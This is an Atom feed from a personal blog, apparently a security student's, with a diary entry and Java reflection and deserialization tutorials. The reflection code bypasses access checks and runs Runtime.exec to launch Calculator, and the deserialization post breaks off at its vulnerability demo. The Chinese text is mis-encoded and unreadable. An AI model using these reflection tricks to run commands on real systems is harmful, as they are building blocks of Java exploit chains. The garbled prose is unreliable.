<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrilic&#39;s blog</title>
  
  <subtitle>ä¸å¿˜åˆå¿ƒ</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://patrilic.top/"/>
  <updated>2020-01-05T13:56:43.363Z</updated>
  <id>http://patrilic.top/</id>
  
  <author>
    <name>Patrilic</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomorrow</title>
    <link href="http://patrilic.top/2099/12/31/Tomorrow/"/>
    <id>http://patrilic.top/2099/12/31/Tomorrow/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2020-01-05T13:56:43.363Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/wallpaper/thumb-1920-485164.jpg" alt></p><h5 id="å†™ç»™è‡ªå·±"><a href="#å†™ç»™è‡ªå·±" class="headerlink" title="å†™ç»™è‡ªå·±"></a>å†™ç»™è‡ªå·±</h5><hr><blockquote><p>Tomorrow is not just another day in your life<br>Itâ€™s the next day in an â€˜it does matterâ€™ life</p></blockquote><hr><p>å…¶å®å‘¢ï¼Œä¸€ç›´æƒ³æŠŠåšå®¢å˜æˆä¸€ä¸ªåªå±äºè‡ªå·±çš„å°å—ç©ºé—´ï¼Œè‡ªå·±æƒ³æ€ä¹ˆè£…é¥°å°±æ€ä¹ˆè£…é¥°ï¼Œæƒ³å†™ä»€ä¹ˆå°±å†™ä»€ä¹ˆï¼Œç”šè‡³ä¹‹å‰æœ‰æ®µæ—¶é—´åªç”¨<code>hexo s</code>233333</p><p>ç°åœ¨è§‰å¾—å‘¢ï¼Œè¿˜æ˜¯ä¸€æ ·ï¼Œä¸ç”¨åœ¨æ„åˆ«äººçš„çœ¼å…‰ï¼Œè‡ªå·±åšå¹²ä»€ä¹ˆå°±åšä»€ä¹ˆï¼Œæ…¢æ…¢æŠŠè‡ªå·±æƒ³å¥½å¥½å†™çš„ä¸œè¥¿æ”¾åœ¨åšå®¢ä¸Šï¼Œç­‰ä»¥åå¹´çºªä¸Šå»äº†ï¼Œä¹Ÿç®—æ˜¯æœ‰ä¸ªçºªå¿µï½</p><p>ä»¥åè¿™é‡Œæˆ‘æ‰“ç®—å†™ä¸€ç‚¹è‡ªå·±ä»ç”Ÿæ´»ä¸­ç»å†çš„äº‹æƒ…å¾—åˆ°çš„æ„Ÿæ‚Ÿæˆ–è€…ä¸€äº›æœ‰è¶£çš„äº‹æƒ…å§ï¼Œæœ¬èº«ä¹Ÿä¸æ˜¯æƒ³ææˆçº¯æŠ€æœ¯åšå®¢çš„ ğŸ˜</p><blockquote><pre><code>-- 2019.8.28 æ—© 3ç‚¹56åˆ†</code></pre></blockquote><h5 id="2019-8-28"><a href="#2019-8-28" class="headerlink" title="2019.8.28"></a>2019.8.28</h5><p>è¿˜æœ‰å‡ å¤©å°±è¦æ­£å¼è¿›å…¥å¤§ä¸‰çš„ç”Ÿæ´»äº†ï¼Œè¯¾è¿˜è¡Œï¼Œä¸»è¦æ˜¯æ„Ÿè§‰å¯èƒ½è¿™è¾ˆå­çš„å­¦ç”Ÿç”Ÿæ¶¯ä¹Ÿå¿«åˆ°å¤´äº†..</p><p>æœ€è¿‘ç»å†å¾ˆå¤šäº‹æƒ…ï¼Œä¹Ÿçœ‹å¼€äº†ï¼Œå¥½å¥½å­¦ä¹ ï¼Œå¥½å¥½ç”Ÿæ´»ã€‚</p><p>åŠè¯¸å›ï¼š èº«ä½“å¥åº·æ‰æ˜¯ç¬¬ä¸€ä½ ï¼Œå“ å…±å‹‰å§</p><p>æ˜å¤©åŠ æ²¹</p><blockquote><p>Just fxxking do it dig fucking deep and get it done</p></blockquote><h5 id="2019-8-30"><a href="#2019-8-30" class="headerlink" title="2019.8.30"></a>2019.8.30</h5><p>å¥½åƒä»Šå¤©è¦å¼€å­¦äº†ï¼Œæ—©ç‚¹ä¼‘æ¯å§ï½</p><blockquote><p>Get raw and get intense</p></blockquote><h5 id="2019-9-9"><a href="#2019-9-9" class="headerlink" title="2019.9.9"></a>2019.9.9</h5><p>å·®è·å•Š..å¤ªèœäº†ï¼Œè¿˜æœ‰ä»€ä¹ˆç†ç”±ä¸åŠªåŠ›çš„å—ï¼Ÿ</p><blockquote><p>å¾®å…‰</p></blockquote><h5 id="2019-9-15"><a href="#2019-9-15" class="headerlink" title="2019.9.15"></a>2019.9.15</h5><blockquote><p>ä¸€åˆ‡æœ‰ä¸ºæ³• å¦‚æ¢¦å¹»æ³¡å½±<br>å¦‚éœ²äº¦å¦‚ç”µ åº”ä½œå¦‚æ˜¯è§‚</p></blockquote><h5 id="2020-1-5"><a href="#2020-1-5" class="headerlink" title="2020.1.5"></a>2020.1.5</h5><p>UNCè·¯å¾„ä¸èƒ½è®¿é—®å¤–ç½‘æœåŠ¡å™¨çš„åŸå› : ç»è¿‡è·¯ç”±ä¸ä¸€å®šéƒ½å¼€æ”¾135,137,139,445</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/wallpaper/thumb-1920-485164.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h5 id=&quot;å†™ç»™è‡ªå·±&quot;&gt;&lt;a href=&quot;#å†™ç»™è‡ªå·±&quot; class=&quot;headerlink&quot; title=&quot;å†™ç»™è‡ªå·±&quot;&gt;&lt;/a&gt;å†™ç»™è‡ªå·±&lt;/h5&gt;&lt;hr&gt;
&lt;blo
      
    
    </summary>
    
      <category term="Diary" scheme="http://patrilic.top/categories/Diary/"/>
    
    
  </entry>
  
  <entry>
    <title>Java Refection</title>
    <link href="http://patrilic.top/2020/03/18/Java%20Reflection/"/>
    <id>http://patrilic.top/2020/03/18/Java Reflection/</id>
    <published>2020-03-18T09:43:11.000Z</published>
    <updated>2020-03-18T09:43:39.737Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-18 17:43:11</p></blockquote><p><img src="/wallpaper/girl_silhouette.jpg" alt></p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åå°„æ˜¯Javaçš„ä¸€ä¸ªé«˜çº§ç‰¹æ€§ï¼ŒæŒ‡åœ¨<code>è¿è¡ŒçŠ¶æ€ä¸­</code>å¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„æ–¹æ³•å’Œå±æ€§ï¼Œåˆ›å»ºå®ä¾‹ï¼Œä¿®æ”¹ç±»æˆå‘˜å˜é‡ç­‰ç­‰ã€‚ è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚</p><h2 id="0x01-ç›¸å…³ç±»"><a href="#0x01-ç›¸å…³ç±»" class="headerlink" title="0x01 ç›¸å…³ç±»"></a>0x01 ç›¸å…³ç±»</h2><table><thead><tr><th>ç±»å</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>Classç±»</td><td>ç±»çš„å®ä½“ï¼Œåœ¨è¿è¡Œçš„Javaåº”ç”¨ç¨‹åºä¸­è¡¨ç¤ºç±»å’Œæ¥å£</td></tr><tr><td>Methodç±»</td><td>ç±»çš„æ–¹æ³•</td></tr><tr><td>Constructç±»</td><td>ç±»çš„æ„é€ æ–¹æ³•</td></tr><tr><td>Fieldç±»</td><td>ç±»çš„æˆå‘˜å˜é‡</td></tr></tbody></table><h3 id="Get-Class"><a href="#Get-Class" class="headerlink" title="Get Class"></a>Get Class</h3><p>è·å–ç±»çš„æ–¹å¼é€šå¸¸æœ‰ä¸‰ç§<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class  runtimeClass1 = Class.forName(className);</span><br><span class="line">Class  runtimeClass2 = java.lang.Runtime.class;</span><br><span class="line">Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è·å–æ•°ç»„ç±»å‹çš„Classå¯¹è±¡æ—¶ï¼Œéœ€è¦ä½¿ç”¨ç‰¹æ®Šçš„Javaæè¿°ç¬¦<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; doubleArray = Class.forName(<span class="string">"[D"</span>);</span><br><span class="line">Class&lt;?&gt; cStringArray = Class.forName(<span class="string">"[[Ljava.lang.String;"</span>);</span><br></pre></td></tr></table></figure></p><h3 id="Get-Construct"><a href="#Get-Construct" class="headerlink" title="Get Construct"></a>Get Construct</h3><p>é¦–å…ˆè·³åˆ°<code>java.lang.Runtime</code>çš„æºç å¤„ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°Runtimeç±»çš„æ„é€ æ–¹æ³•æ˜¯privateå±æ€§çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸å…è®¸å…¶ä»–äººåˆ›å»ºå®ä¾‹ã€‚<br><img src="/Java Reflection.resources/D1AB073F-6FFC-46E6-98C6-AB307372ED9E.png" alt="e488ae699f0ee7f64c5842bfbd585adb"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ²¡æœ‰<code>import java.lang.Runtime</code>çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½å¤Ÿå»newä¸€ä¸ªæ–°çš„Runtimeå¯¹è±¡çš„</p><p>åå°„æœºåˆ¶æä¾›äº†ä¸¤ç§æ–¹æ³•å¯ä»¥è·å–ç±»çš„æ„é€ æ–¹æ³•ï¼š </p><ul><li>runtimeClass1.getDeclaredConstructor </li><li>runtimeClass1.getConstructor // ä¸èƒ½è·å–privateæ–¹æ³•</li></ul><p>è·å–Constuctåï¼Œä½¿ç”¨<code>constructor.newInstance()</code>å®ä¾‹åŒ–</p><p>å½“æˆ‘ä»¬æ²¡æœ‰è®¿é—®æ„é€ æ–¹æ³•æƒé™æ—¶æˆ‘ä»¬åº”è¯¥è°ƒç”¨constructor.setAccessible(true)ä¿®æ”¹è®¿é—®æƒé™å°±å¯ä»¥æˆåŠŸçš„åˆ›å»ºå‡ºç±»å®ä¾‹äº†</p><h3 id="Get-Method"><a href="#Get-Method" class="headerlink" title="Get Method"></a>Get Method</h3><p>è·å–å½“å‰ç±»æ‰€æœ‰çš„æˆå‘˜æ–¹æ³•ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] methods = runtimeClass1.getDeclaredMethods();</span><br></pre></td></tr></table></figure></p><p>è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜æ–¹æ³•ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method method = clazz.getDeclaredMethod(<span class="string">"æ–¹æ³•å"</span>);</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡method.invokeå¯ä»¥è°ƒç”¨æ–¹æ³•ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(æ–¹æ³•å®ä¾‹å¯¹è±¡, æ–¹æ³•å‚æ•°å€¼ï¼Œå¤šä¸ªå‚æ•°å€¼ç”¨<span class="string">","</span>éš”å¼€);</span><br></pre></td></tr></table></figure></p><p>method.invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ç±»å®ä¾‹å¯¹è±¡ï¼Œå¦‚æœè°ƒç”¨çš„æ˜¯staticæ–¹æ³•é‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°å€¼å¯ä»¥ä¼ nullï¼Œå› ä¸ºåœ¨javaä¸­è°ƒç”¨é™æ€æ–¹æ³•æ˜¯ä¸éœ€è¦æœ‰ç±»å®ä¾‹çš„ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥ç±»å.æ–¹æ³•å(å‚æ•°)çš„æ–¹å¼è°ƒç”¨</p><h3 id="Get-Field"><a href="#Get-Field" class="headerlink" title="Get Field"></a>Get Field</h3><p>è·å–å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜å˜é‡ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field fields = clazz.getDeclaredFields();</span><br></pre></td></tr></table></figure></p><p>è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜å˜é‡ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field field  = clazz.getDeclaredField(<span class="string">"å˜é‡å"</span>);</span><br></pre></td></tr></table></figure></p><p>è·å–å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜å˜é‡ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field fields = clazz.getDeclaredFields();</span><br></pre></td></tr></table></figure></p><p>è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜å˜é‡ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field field  = clazz.getDeclaredField(<span class="string">"å˜é‡å"</span>);</span><br></pre></td></tr></table></figure></p><p>å½“æˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹çš„æˆå‘˜å˜é‡æƒé™æ—¶å¯ä»¥ä½¿ç”¨: field.setAccessible(true)çš„æ–¹å¼ä¿®æ”¹ä¸ºè®¿é—®æˆå‘˜å˜é‡è®¿é—®æƒé™</p><p>ä¿®æ”¹finalå…³é”®å­—ä¿®é¥°çš„å˜é‡æ—¶ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åå°„è·å–Fieldç±»çš„modifiers</span></span><br><span class="line">Field modifiers = field.getClass().getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®modifiersä¿®æ”¹æƒé™</span></span><br><span class="line">modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹æˆå‘˜å˜é‡çš„Fieldå¯¹è±¡çš„modifierså€¼</span></span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹æˆå‘˜å˜é‡å€¼</span></span><br><span class="line">field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼);</span><br></pre></td></tr></table></figure></p><h2 id="0x02-åå°„java-lang-Runtime"><a href="#0x02-åå°„java-lang-Runtime" class="headerlink" title="0x02 åå°„java.lang.Runtime"></a>0x02 åå°„java.lang.Runtime</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.reflect;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeClass</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">String className     = <span class="string">"java.lang.Runtime"</span>;</span><br><span class="line">Class  runtimeClass1 = Class.forName(className);</span><br><span class="line">Class  runtimeClass2 = java.lang.Runtime.class;</span><br><span class="line">Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);</span><br><span class="line"></span><br><span class="line">System.out.println(runtimeClass1);</span><br><span class="line">System.out.println(runtimeClass2);</span><br><span class="line">System.out.println(runtimeClass3);</span><br><span class="line"></span><br><span class="line">Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºRuntimeç±»ç¤ºä¾‹ï¼Œç­‰ä»·äº Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–Runtimeçš„exec(String cmd)æ–¹æ³•</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Method runtimeMethod = runtimeClass1.getMethod(<span class="string">"exec"</span>, String.class);</span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, <span class="string">"open -a /System/Applications/Calculator.app"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Java Reflection.resources/9777955F-F737-4684-A531-6EF91AA1936E.png" alt="c1abfa931867d7ce0f429414ec7f27e0"></p><h2 id="0x03-ç›¸å…³é“¾æ¥"><a href="#0x03-ç›¸å…³é“¾æ¥" class="headerlink" title="0x03 ç›¸å…³é“¾æ¥"></a>0x03 ç›¸å…³é“¾æ¥</h2><p><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html</a><br><a href="https://www.jianshu.com/p/9be58ee20dee" target="_blank" rel="noopener">https://www.jianshu.com/p/9be58ee20dee</a><br><a href="https://xz.aliyun.com/t/2342" target="_blank" rel="noopener">https://xz.aliyun.com/t/2342</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-18 17:43:11&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/girl_silhouette.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
      <category term="Java_Sec" scheme="http://patrilic.top/categories/Java-Sec/"/>
    
    
      <category term="Javaåå°„" scheme="http://patrilic.top/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>Javaååºåˆ—åŒ–å­¦ä¹ </title>
    <link href="http://patrilic.top/2020/03/18/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://patrilic.top/2020/03/18/Java ååºåˆ—åŒ–/</id>
    <published>2020-03-18T03:26:55.000Z</published>
    <updated>2020-03-18T03:28:17.371Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-18 11:26:55</p></blockquote><p><img src="/wallpaper/girl_field_night.jpg" alt></p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>Javaä¸­åªéœ€è¦å®ç°<code>java.io.Serializable</code>æˆ–è€…<code>java.io.Externalizable</code>æ¥å£å³å¯æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</p><h2 id="0x01-æ„é€ åºåˆ—åŒ–-ååºåˆ—åŒ–æ“ä½œ"><a href="#0x01-æ„é€ åºåˆ—åŒ–-ååºåˆ—åŒ–æ“ä½œ" class="headerlink" title="0x01 æ„é€ åºåˆ—åŒ–/ååºåˆ—åŒ–æ“ä½œ"></a>0x01 æ„é€ åºåˆ—åŒ–/ååºåˆ—åŒ–æ“ä½œ</h2><p>æ„é€ ä¸€ä¸ªè°ƒç”¨ç±»ï¼Œå…¶ä¸­ï¼ŒExployeeç±»å®ç°äº†<code>java.io.Serializable</code>æ¥å£ ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.testSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> String identify;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mailCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"This is the "</span>+<span class="keyword">this</span>.identify+<span class="string">" of our company"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åºåˆ—åŒ–æ“ä½œ, åœ¨è°ƒç”¨Employeeç±»æ—¶ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½ä¼šè¢«åºåˆ—åŒ–<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.testSer;</span><br><span class="line"><span class="keyword">import</span> com.patrilic.testSer.Employee;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.sun.xml.internal.bind.v2.runtime.unmarshaller.XsiNilLoader.Array;</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Step1</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> </span>&#123;</span><br><span class="line">      Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line">      e.name = <span class="string">"å‘˜å·¥ç”²"</span>;</span><br><span class="line">      e.identify = <span class="string">"General staff"</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¾“å…¥æµ</span></span><br><span class="line">         FileOutputStream fileOut =</span><br><span class="line">         <span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/test.db"</span>);</span><br><span class="line">         <span class="comment">// å»ºç«‹å¯¹è±¡è¾“å…¥æµ</span></span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fileOut);</span><br><span class="line">         <span class="comment">//è¾“å‡ºååºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">         out.writeObject(e);</span><br><span class="line">         out.close();</span><br><span class="line">         fileOut.close();</span><br><span class="line">         System.out.printf(<span class="string">"Serialized data is saved in /tmp/test.db"</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">          i.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ååºåˆ—åŒ–æ“ä½œ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.testSer;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Step2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">  </span><br><span class="line">      Employee e = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¾“å…¥æµ</span></span><br><span class="line">         FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">"/tmp/test.db"</span>);</span><br><span class="line">        <span class="comment">// å»ºç«‹å¯¹è±¡è¾“å…¥æµ</span></span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">        <span class="comment">// è¯»å–å¯¹è±¡</span></span><br><span class="line">         e = (Employee) in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line">         fileIn.close();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">         i.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(ClassNotFoundException c)</span><br><span class="line">      &#123;</span><br><span class="line">         System.out.println(<span class="string">"Employee class not found"</span>);</span><br><span class="line">         c.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">"Deserialized Employee..."</span>);</span><br><span class="line">      System.out.println(<span class="string">"Name: "</span> + e.name);</span><br><span class="line">      System.out.println(<span class="string">"This is the "</span>+e.identify+<span class="string">" of our company"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/Java ååºåˆ—åŒ–.resources/13259480-88F4-4BA5-A0FA-757AC0180B25.png" alt="5c76564b213c37611a5e44668313a8bd"></p><h2 id="0x02-ååºåˆ—åŒ–æ¼æ´"><a href="#0x02-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="0x02 ååºåˆ—åŒ–æ¼æ´"></a>0x02 ååºåˆ—åŒ–æ¼æ´</h2><p>Javaååºåˆ—åŒ–ä¸­ï¼Œä¼šè°ƒç”¨è¢«ååºåˆ—åŒ–çš„readObjectæ–¹æ³•ï¼Œå¦‚æœreadObjectæ–¹æ³•æ˜¯æ¶æ„çš„ï¼Œé‚£ä¹ˆå°±ä¼šå¼•å‘æ¼æ´</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 